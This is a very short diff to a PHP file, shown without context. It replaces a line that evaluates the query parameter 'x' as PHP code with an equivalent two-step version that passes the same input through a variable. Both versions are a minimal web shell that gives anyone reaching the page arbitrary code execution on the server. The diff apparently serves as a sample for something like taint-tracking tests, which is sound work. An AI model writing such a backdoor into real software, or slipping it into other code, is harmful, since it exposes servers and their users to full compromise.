@@ -1,4 +1,5 @@
 <?php
 
-
-eval($_GET["x"]);
+eval($a);
+$a = $_GET["x"];
+eval($a);
